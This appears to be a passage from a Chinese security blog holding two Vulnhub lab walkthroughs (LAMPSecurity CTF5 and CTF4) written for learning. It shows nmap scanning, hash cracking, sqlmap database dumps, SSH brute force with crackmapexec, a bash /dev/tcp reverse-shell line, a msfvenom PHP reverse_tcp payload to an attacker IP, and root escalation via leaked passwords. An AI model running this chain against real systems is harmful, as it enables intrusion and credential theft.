<td>192.168.134.1</td>
</tr>
<tr>
<td>靶机</td>
<td>192.168.134.152</td>
</tr>
</tbody></table>
<h2 id="1-netdiscover-同段主机存活主机探测"><a href="#1-netdiscover-同段主机存活主机探测" class="headerlink" title="1. netdiscover 同段主机存活主机探测"></a>1. netdiscover 同段主机存活主机探测</h2><blockquote>
<p>sudo netdiscover -i eth0 -r 192.168.134.0&#x2F;24</p>
</blockquote>
<p><img src="/images/image-20230317162053217.png" alt="image-20230317162053217"></p>
<h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
<p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.152</p>
</blockquote>
<p><img src="/images/image-20230317162537416.png" alt="image-20230317162537416"></p>
<p>​	可以看出当前靶场开放较多端口，这里的话重点关注22、80、3306</p>
<h3 id="2-2-TCP服务开放性探测"><a href="#2-2-TCP服务开放性探测" class="headerlink" title="2.2 TCP服务开放性探测"></a>2.2 TCP服务开放性探测</h3><blockquote>
<p>sudo nmap -sT -sV -sC -A -O -p- 192.168.134.152</p>
</blockquote>
<p><img src="/images/image-20230317162830184.png" alt="image-20230317162830184"></p>
<h3 id="2-3-UDP服务开放性探测"><a href="#2-3-UDP服务开放性探测" class="headerlink" title="2.3 UDP服务开放性探测"></a>2.3 UDP服务开放性探测</h3><blockquote>
<p>sudo nmap –min-rate 10000 -p- sU -v 192.168.134.152</p>
</blockquote>
<p><img src="/images/image-20230317162506365.png" alt="image-20230317162506365"></p>
<h3 id="2-4-服务端vuln脚本探测"><a href="#2-4-服务端vuln脚本探测" class="headerlink" title="2.4 服务端vuln脚本探测"></a>2.4 服务端vuln脚本探测</h3><blockquote>
<p>sudo nmap –script&#x3D;vuln -p 22,25,80,110,111,139,143,445,901,3306,50156 192.168.134.152</p>
</blockquote>
<p><img src="/images/image-20230317163344786.png" alt="image-20230317163344786"></p>
<p>​	发现存在phpmyadmin目录，也发现了其他几个可能存在敏感信息泄漏的文件，例如info.php</p>
<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h2><h3 id="3-1-根据Nmap扫描结果，对80端口web服务进行测试"><a href="#3-1-根据Nmap扫描结果，对80端口web服务进行测试" class="headerlink" title="3.1.  根据Nmap扫描结果，对80端口web服务进行测试"></a>3.1.  根据Nmap扫描结果，对80端口web服务进行测试</h3><h4 id="3-1-1-访问-http-192-168-70-193-info-php"><a href="#3-1-1-访问-http-192-168-70-193-info-php" class="headerlink" title="3.1.1 访问 http://192.168.70.193/info.php:"></a>3.1.1 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/info.php">http://192.168.70.193/info.php</a>:</h4><p><img src="/images/image-20240314182459680.png" alt="image-20240314182459680"></p>
<h4 id="3-1-2-访问-http-192-168-70-193-phpmyadmin"><a href="#3-1-2-访问-http-192-168-70-193-phpmyadmin" class="headerlink" title="3.1.2 访问 http://192.168.70.193/phpmyadmin:"></a>3.1.2 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/phpmyadmin">http://192.168.70.193/phpmyadmin</a>:</h4><p><img src="/images/image-20240314182522165.png" alt="image-20240314182522165"></p>
<h4 id="3-1-3-访问-http-192-168-70-193-inc-php"><a href="#3-1-3-访问-http-192-168-70-193-inc-php" class="headerlink" title="3.1.3 访问 http://192.168.70.193/inc.php:"></a>3.1.3 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/inc.php">http://192.168.70.193/inc.php</a>:</h4><p><img src="/images/image-20240314182622132.png" alt="image-20240314182622132"></p>
<h4 id="3-1-4-访问-http-192-168-70-193-andy-index-php"><a href="#3-1-4-访问-http-192-168-70-193-andy-index-php" class="headerlink" title="3.1.4 访问 http://192.168.70.193/~andy/index.php:"></a>3.1.4 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php">http://192.168.70.193/~andy/index.php</a>:</h4><blockquote>
<p>可以发现当点击Navigation时，不同的页面调整是通过page参数控制的:</p>
<p><a target="_blank" rel="noopener" href="http://192.168.134.152/~andy/index.php?page=home">http://192.168.134.152/~andy/index.php?page=home</a></p>
</blockquote>
<p><img src="/images/image-20230322091931405.png" alt="image-20230322091931405"></p>
<h3 id="3-2-NanoCMS-HASH泄露"><a href="#3-2-NanoCMS-HASH泄露" class="headerlink" title="3.2 NanoCMS HASH泄露"></a>3.2 NanoCMS HASH泄露</h3><h4 id="3-2-1-CMS-框架识别"><a href="#3-2-1-CMS-框架识别" class="headerlink" title="3.2.1 CMS 框架识别"></a>3.2.1 CMS 框架识别</h4><p>​	在<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php%E9%A1%B5%E9%9D%A2%E4%B8%ADF12%E6%89%93%E5%BC%80%E6%8E%A7%E5%88%B6%E5%8F%B0%EF%BC%8C%E5%9C%A8/">http://192.168.70.193/~andy/index.php页面中F12打开控制台，在\</a>&lt;meta&gt;标签中泄露了当前页面所使用的是 NanoCMS</p>
<p><img src="/images/image-20240314154429622.png" alt="image-20240314154429622"></p>
<h4 id="3-2-2-NanoCMS-历史漏洞"><a href="#3-2-2-NanoCMS-历史漏洞" class="headerlink" title="3.2.2 NanoCMS 历史漏洞"></a>3.2.2 NanoCMS 历史漏洞</h4><p>​	在一些公开的漏洞库中可以查询到NanoCMS在低版本中存在漏洞，我们可以通过<code>NanoCMS密码hash泄露</code>获取到我们想要的管理员信息，访问<code>http://192.168.134.152/~andy/data/pagesdata.txt</code>，对password字段进行md5解密获取到以下信息:</p>
<p><img src="/images/image-20230322092821310.png" alt="image-20230322092821310"></p>
<p>​	对获取到的password的hash值进行判断，使用的加密方式</p>
<blockquote>
<p>hash-identifier 判断获取的hash散列值可能的加密方式</p>
</blockquote>
<p><img src="/images/image-20240314154715200.png" alt="image-20240314154715200"></p>
<p>​	对散列值进行暴力破解</p>
<blockquote>
<p>hashcat -a 0 -m 0 9d2f75377ac0ab991d40c91fd27e52fd &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt </p>
</blockquote>
<p><img src="/images/image-20240314155417087.png" alt="image-20240314155417087"></p>
<p>​	获取到登录接口的一个账号密码</p>
<blockquote>
<p>username: admin</p>
<p>password: shannon</p>
</blockquote>
<h3 id="3-3-前端后台获取shell"><a href="#3-3-前端后台获取shell" class="headerlink" title="3.3 前端后台获取shell"></a>3.3 前端后台获取shell</h3><h4 id="3-3-1-登录前端后台"><a href="#3-3-1-登录前端后台" class="headerlink" title="3.3.1 登录前端后台"></a>3.3.1 登录前端后台</h4><p>​	访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php?page=home%EF%BC%8C%E8%A7%82%E5%AF%9F%E5%88%B0%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8Login%E6%8E%A5%E5%8F%A3">http://192.168.70.193/~andy/index.php?page=home，观察到当前页面存在Login接口</a></p>
<p><img src="/images/image-20240314155208870.png" alt="image-20240314155208870"></p>
<p>​		点击‘Admin Login’，跳转到<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/data/nanoadmin.php%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B8%8A%E9%9D%A2%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95">http://192.168.70.193/~andy/data/nanoadmin.php，使用上面泄露出来的账号密码进行登录</a></p>
<p><img src="/images/image-20240314155316769.png" alt="image-20240314155316769"></p>
<p>​		对Admin界面的功能点进行一波测试</p>
<p><img src="/images/image-20230322093129087.png" alt="image-20230322093129087"></p>
<h4 id="3-3-2-管理员后台命令执行漏洞"><a href="#3-3-2-管理员后台命令执行漏洞" class="headerlink" title="3.3.2 管理员后台命令执行漏洞"></a>3.3.2 管理员后台命令执行漏洞</h4><p>​		这里重点关注‘New Page’功能模块，这里存在这一处命令执行漏洞，下面是验证过程：</p>
<p><img src="/images/image-20230322093224661.png" alt="image-20230322093224661"></p>
<p>​		创建页面成功后，就提示你新的页面在 pages&#x2F;echo-hello.php</p>
<p><img src="/images/image-20230322093308863.png" alt="image-20230322093308863"></p>
<p>​		访问<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/pages/echo-hello.php%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C">http://192.168.70.193/~andy/pages/echo-hello.php，发现命令成功执行</a></p>
<p><img src="/images/image-20230322093322393.png" alt="image-20230322093322393"></p>
<p>​		这样我们就简单了，我们可以通过反弹shell获取到会话：</p>
<blockquote>
<ol>
<li><p>bash 反弹shell</p>
<blockquote>
<p>&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[: ip]&#x2F;[: port] 0&gt;&amp;1</p>
</blockquote>
</li>
<li><p>后端脚本语言反弹shell</p>
</li>
</ol>
</blockquote>
<h3 id="3-4-MSF生成PHP后门GetShell"><a href="#3-4-MSF生成PHP后门GetShell" class="headerlink" title="3.4 MSF生成PHP后门GetShell"></a>3.4 MSF生成PHP后门GetShell</h3><h4 id="3-4-1-生成PHP反弹shell的后门代码"><a href="#3-4-1-生成PHP反弹shell的后门代码" class="headerlink" title="3.4.1 生成PHP反弹shell的后门代码"></a>3.4.1 生成PHP反弹shell的后门代码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.134.147 LPORT=4444 -f raw</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230322093806689.png" alt="image-20230322093806689"></p>
<h4 id="3-4-2-New-Page-上传后门代码"><a href="#3-4-2-New-Page-上传后门代码" class="headerlink" title="3.4.2 New Page 上传后门代码"></a>3.4.2 New Page 上传后门代码</h4><p><img src="/images/image-20230322093915630.png" alt="image-20230322093915630"></p>
<h4 id="3-4-3-设置MSFCONSOLE监听"><a href="#3-4-3-设置MSFCONSOLE监听" class="headerlink" title="3.4.3 设置MSFCONSOLE监听"></a>3.4.3 设置MSFCONSOLE监听</h4><p><img src="/images/image-20230322094241882.png" alt="image-20230322094241882"></p>
<h4 id="3-4-4-访问后门文件，成功反弹shell"><a href="#3-4-4-访问后门文件，成功反弹shell" class="headerlink" title="3.4.4 访问后门文件，成功反弹shell"></a>3.4.4 访问后门文件，成功反弹shell</h4><p>​		经过简单的测试发现当前用户为apache，所以我们需要对此进行提权</p>
<p><img src="/images/image-20230322094553555.png" alt="image-20230322094553555"></p>
<h4 id="3-4-5-隐藏日志，成功获取到root权限"><a href="#3-4-5-隐藏日志，成功获取到root权限" class="headerlink" title="3.4.5 隐藏日志，成功获取到root权限"></a>3.4.5 隐藏日志，成功获取到root权限</h4><p>​		对所有文件路径一次访问，在<code>/home/patrick</code>目录下发现隐藏文件路径，</p>
<p><img src="/images/image-20230322094717490.png" alt="image-20230322094717490"></p>
<p>​		这里我们需要了解一下什么是”tomboy”，这样也就知道了我们为什么要关注tomboy这个文件夹</p>
<blockquote>
<p>一个linux系统下桌面即时贴软件，可以记录文字，是一个小巧、易用、跨系统的桌面便笺工具</p>
</blockquote>
<p>​		我们查看便签中的最新记录，就可以发现root用户的账号密码</p>
<p><img src="/images/image-20230322094910413.png" alt="image-20230322094910413"></p>
<blockquote>
<h3 id="切换管理员账号"><a href="#切换管理员账号" class="headerlink" title="切换管理员账号"></a>切换管理员账号</h3><p>su root </p>
</blockquote>
<p><img src="/images/image-20230322095518004.png" alt="image-20230322095518004"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" data-id="clu6lf1hg000na2vd0dyr5upz" data-title="vulnhub-LAMPSecurity-CTF5.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-vulnhub-LAMPSecurity-CTF4-md" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/" class="article-date">
  <time class="dt-published" datetime="2024-03-14T06:14:26.000Z" itemprop="datePublished">2024-03-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/">vulnhub-LAMPSecurity-CTF4.md</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTF4-靶场"><a href="#CTF4-靶场" class="headerlink" title="CTF4 靶场"></a>CTF4 靶场</h1><h2 id="0-环境配置"><a href="#0-环境配置" class="headerlink" title="0. 环境配置"></a>0. 环境配置</h2><table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>攻击机</td>
<td>192.168.134.1</td>
</tr>
<tr>
<td>靶机</td>
<td>192.168.134.136</td>
</tr>
</tbody></table>
<h2 id="1-netdiscover-同段主机存活主机探测"><a href="#1-netdiscover-同段主机存活主机探测" class="headerlink" title="1. netdiscover 同段主机存活主机探测"></a>1. netdiscover 同段主机存活主机探测</h2><blockquote>
<p>sudo netdiscover -i eth0 -r 192.168.134.0&#x2F;24</p>
</blockquote>
<p><img src="/images/image-20230317130307367.png" alt="image-20230317130307367"></p>
<h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
<p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.136</p>
</blockquote>
<p><img src="/images/image-20230317131853119.png" alt="image-20230317131853119"></p>
<p>​	可以看到在靶机上开放了22、25、80端口。</p>
<h3 id="2-2-UDP服务开放性探测"><a href="#2-2-UDP服务开放性探测" class="headerlink" title="2.2 UDP服务开放性探测"></a>2.2 UDP服务开放性探测</h3><blockquote>
<p>sudo nmap –min-rate 10000 -p- -sU -v 192.168.134.136</p>
</blockquote>
<p><img src="/images/image-20230317135745160.png" alt="image-20230317135745160"></p>
<h3 id="2-3-TCP服务开放性探测"><a href="#2-3-TCP服务开放性探测" class="headerlink" title="2.3 TCP服务开放性探测"></a>2.3 TCP服务开放性探测</h3><blockquote>
<p>sudo nmap -sT -sV -sC -O -A -v 192.168.134.136</p>
</blockquote>
<p><img src="/images/1679033260389.png" alt="1679033260389"></p>
<p>​	可以看到在靶机上开放的80端口上，已经扫描出了几个目录:&#x2F;email、&#x2F;restricted、&#x2F;conf、&#x2F;sql、&#x2F;admin</p>
<h3 id="2-4-服务端vuln脚本探测"><a href="#2-4-服务端vuln脚本探测" class="headerlink" title="2.4 服务端vuln脚本探测"></a>2.4 服务端vuln脚本探测</h3><blockquote>
<p>sudo nmap –script&#x3D;vuln -p 192.168.134.136</p>
</blockquote>
<p><img src="/images/image-20240314113356470.png" alt="image-20240314113356470"></p>
<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h2><h3 id="3-1-根据Nmap扫描结果，对80端口web服务进行测试"><a href="#3-1-根据Nmap扫描结果，对80端口web服务进行测试" class="headerlink" title="3.1.  根据Nmap扫描结果，对80端口web服务进行测试"></a>3.1.  根据Nmap扫描结果，对80端口web服务进行测试</h3><p>​	访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/">http://192.168.134.136</a> 根目录，对站点多个功能点进行访问测试，初步认定为blog站点</p>
<p><img src="/images/image-20230317132926092.png" alt="image-20230317132926092"></p>
<p>​	根据nmap扫描结果，扫描出的可以路径进行访问:</p>
<p><img src="/images/image-20240314113213187.png" alt="image-20240314113213187"></p>
<h4 id="3-1-1-访问-http-192-168-134-136-mail-src-login-php"><a href="#3-1-1-访问-http-192-168-134-136-mail-src-login-php" class="headerlink" title="3.1.1 访问 http://192.168.134.136/mail/src/login.php:"></a>3.1.1 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/mail/src/login.php">http://192.168.134.136/mail/src/login.php</a>:</h4><p>​	在该路径上部署了一个邮件系统，尝试使用弱口令进行爆破，无解。</p>
<p><img src="/images/image-20240314120037082.png" alt="image-20240314120037082"></p>
<h4 id="3-1-2-访问-http-192-168-134-136-restricted"><a href="#3-1-2-访问-http-192-168-134-136-restricted" class="headerlink" title="3.1.2 访问 http://192.168.134.136/restricted:"></a>3.1.2 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/restricted">http://192.168.134.136/restricted</a>:</h4><p>​	访问过程中出现身份认证，尝试使用弱口令进行爆破，无解。</p>
<p><img src="/images/image-20240314120522533.png" alt="image-20240314120522533"></p>
<h4 id="3-1-3-访问-http-192-168-134-136-conf"><a href="#3-1-3-访问-http-192-168-134-136-conf" class="headerlink" title="3.1.3 访问 http://192.168.134.136/conf:"></a>3.1.3 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/conf">http://192.168.134.136/conf</a>:</h4><p><img src="/images/image-20240314120634039.png" alt="image-20240314120634039"></p>
<h4 id="3-1-4-访问-http-192-168-134-136-sql"><a href="#3-1-4-访问-http-192-168-134-136-sql" class="headerlink" title="3.1.4 访问 http://192.168.134.136/sql:"></a>3.1.4 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/sql">http://192.168.134.136/sql</a>:</h4><p>​	尝试访问&#x2F;sql路径，发现存在db.sql文件，</p>
<p><img src="/images/image-20240314120747664.png" alt="image-20240314120747664"></p>
<p>​	那么我们就继续访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/sql/db.sql">http://192.168.134.136/sql/db.sql</a>:</p>
<p><img src="/images/image-20240314120840891.png" alt="image-20240314120840891"></p>
<p>​	存储的内容时创建用户时所用的SQL，并为出现初始化的用户数据</p>
<h4 id="3-1-5-访问-http-192-168-134-136-admin"><a href="#3-1-5-访问-http-192-168-134-136-admin" class="headerlink" title="3.1.5 访问 http://192.168.134.136/admin:"></a>3.1.5 访问 <a target="_blank" rel="noopener" href="http://192.168.134.136/admin">http://192.168.134.136/admin</a>:</h4><p>​	尝试使用弱口令进行爆破，无解。</p>
<p><img src="/images/image-20240314120914483.png" alt="image-20240314120914483"></p>
<h3 id="3-2-发现SQL注入点，尝试dump所有数据"><a href="#3-2-发现SQL注入点，尝试dump所有数据" class="headerlink" title="3.2 发现SQL注入点，尝试dump所有数据"></a>3.2 发现SQL注入点，尝试dump所有数据</h3><p>​	继续翻看Nmap扫描结果发现在首页index.html存在CSRF和SQL Injection</p>
<p><img src="/images/image-20240314121620456.png" alt="image-20240314121620456"></p>
<p><img src="/images/image-20240314121609312.png" alt="image-20240314121609312"></p>
<p>​	查看Blog博客界面发现在<code>http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2%27</code>处的id参数存在SQL注入</p>
<p><img src="/images/image-20230317134552420.png" alt="image-20230317134552420"></p>
<p>​		我们直接SQLmap一把梭哈，获取到一些一些用户名密码，我们将它记录下来(下面是获取当前表单用户内容的执行方法，其他表单获取数据与下述方法类似)：</p>
<blockquote>
<h3 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –banner</p>
<h3 id="获取当前所使用的数据库"><a href="#获取当前所使用的数据库" class="headerlink" title="获取当前所使用的数据库"></a>获取当前所使用的数据库</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –dbms mysql –dbs</p>
<h3 id="获取当前所使用的数据库中的所有表单"><a href="#获取当前所使用的数据库中的所有表单" class="headerlink" title="获取当前所使用的数据库中的所有表单"></a>获取当前所使用的数据库中的所有表单</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –dbms mysql -D ehks –tables</p>
<h3 id="获取当前所使用数据库中user表单中的所有数据"><a href="#获取当前所使用数据库中user表单中的所有数据" class="headerlink" title="获取当前所使用数据库中user表单中的所有数据"></a>获取当前所使用数据库中user表单中的所有数据</h3><p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.134.136/index.html?page=blog&title=Blog&id=2">http://192.168.134.136/index.html?page=blog&amp;title=Blog&amp;id=2</a>*” –dbms mysql -D ehks -T user –dump</p>
</blockquote>
<h4 id="3-2-1-执行结果"><a href="#3-2-1-执行结果" class="headerlink" title="3.2.1 执行结果"></a>3.2.1 执行结果</h4><p><img src="/images/image-20230317140437567.png" alt="image-20230317140437567"></p>
<p><img src="/images/image-20230317141252280.png" alt="image-20230317141252280"></p>
<p><img src="/images/1679033670529.png" alt="1679033670529"></p>
<p><img src="/images/image-20230317141553594.png" alt="image-20230317141553594"></p>
<h4 id="3-2-2-其他用户表单中数据"><a href="#3-2-2-其他用户表单中数据" class="headerlink" title="3.2.2 其他用户表单中数据"></a>3.2.2 其他用户表单中数据</h4><p>​	calendar.phpc_user</p>
<p><img src="/images/image-20240314122716884.png" alt="image-20240314122716884"></p>
<p>​	roundcubemail.users</p>
<p><img src="/images/image-20240314122820322.png" alt="image-20240314122820322"></p>
<h3 id="3-3-SSH链接爆破"><a href="#3-3-SSH链接爆破" class="headerlink" title="3.3 SSH链接爆破"></a>3.3 SSH链接爆破</h3><p>​	将跑出来的数据划分成爆破用的字典</p>
<blockquote>
<h3 id="生成对应的用户名字典"><a href="#生成对应的用户名字典" class="headerlink" title="生成对应的用户名字典"></a>生成对应的用户名字典</h3><p>cat ehks_user.txt | awk -F’|’ ‘{print $3}’ &gt;&gt; username.txt</p>
<h3 id="生成对应的密码字典"><a href="#生成对应的密码字典" class="headerlink" title="生成对应的密码字典"></a>生成对应的密码字典</h3><p>cat ehks_user.txt | awk -F’|’ ‘{print $4}’ | awk -F’[()]’ ‘{print $2}’ &gt;&gt; password.txt</p>
<h3 id="使用爆破工具爆破SSH链接"><a href="#使用爆破工具爆破SSH链接" class="headerlink" title="使用爆破工具爆破SSH链接"></a>使用爆破工具爆破SSH链接</h3><p>crackmapexec ssh 192.168.134.136 -p password -u username.txt –continue-on-success</p>
<p>​	–continue-on-success 表示当爆破出来后继续爆破</p>
</blockquote>
<p><img src="/images/image-20230317151548630.png" alt="image-20230317151548630"></p>
<p>​		尝试使用上面的用户名和密码进行SSH链接</p>
<blockquote>
<p>ssh -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 -oHostKeyAlgorithms&#x3D;+ssh-dss -oCiphers&#x3D;+3des-cbc <a href="mailto:&#100;&#115;&#116;&#101;&#118;&#101;&#x6e;&#x73;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#49;&#x33;&#52;&#46;&#49;&#x33;&#x36;">&#100;&#115;&#116;&#101;&#118;&#101;&#x6e;&#x73;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#49;&#x33;&#52;&#46;&#49;&#x33;&#x36;</a></p>
</blockquote>
<p><img src="/images/image-20230317144444254.png" alt="image-20230317144444254"></p>
<p>​		成功连接上主机，可以发现我们是一个低权限账号，下面我们就该提权限了</p>
<p><img src="/images/image-20230317152116430.png" alt="image-20230317152116430"></p>
<h3 id="3-4-权限提升"><a href="#3-4-权限提升" class="headerlink" title="3.4 权限提升"></a>3.4 权限提升</h3><p>​	使用 <code>sudo -l</code> 列出当前用户在系统上可执行的命令和特权的命令，发现是<code>(ALL)ALL</code></p>
<p><img src="/images/image-20240314123021307.png" alt="image-20240314123021307"></p>
<p>​		那么就不用说了，直接 sudo 提权</p>
<blockquote>
<p>sudo su</p>
<p>密码: ilike2surf</p>
</blockquote>
<p><img src="/images/image-20230317153014419.png" alt="image-20230317153014419"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF4-md/" data-id="clu6lf1h1000ja2vd7j0d8duj" data-title="vulnhub-LAMPSecurity-CTF4.md" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/error/" rel="tag">error</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/error/" style="font-size: 10px;">error</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/protocol/" style="font-size: 10px;">protocol</a> <a href="/tags/pwn/" style="font-size: 13.33px;">pwn</a> <a href="/tags/scanner/" style="font-size: 10px;">scanner</a> <a href="/tags/tools/" style="font-size: 16.67px;">tools</a> <a href="/tags/vulnhub/" style="font-size: 16.67px;">vulnhub</a> <a href="/tags/web/" style="font-size: 20px;">web</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/03/25/tools-CMD-hidden-cmdline/">tools-CMD-hidden-cmdline</a>
          </li>
        
          <li>
            <a href="/2024/03/25/tools-CMD-attrib/">tools-CMD-attrib</a>
          </li>
        
          <li>
            <a href="/2024/03/25/web-XSS-FlashXss-xss-PDF/">web-XSS-FlashXss-xss-PDF</a>
          </li>
        
          <li>
            <a href="/2024/03/22/web-XSS-FlashXss-xss-labs20/">web-XSS-FlashXss-xss-labs20</a>
          </li>
        
          <li>
            <a href="/2024/03/22/web-XSS-FlashXss-xss-labs/">web-XSS-FlashXss-xss-labs</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 R0seK1llere<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>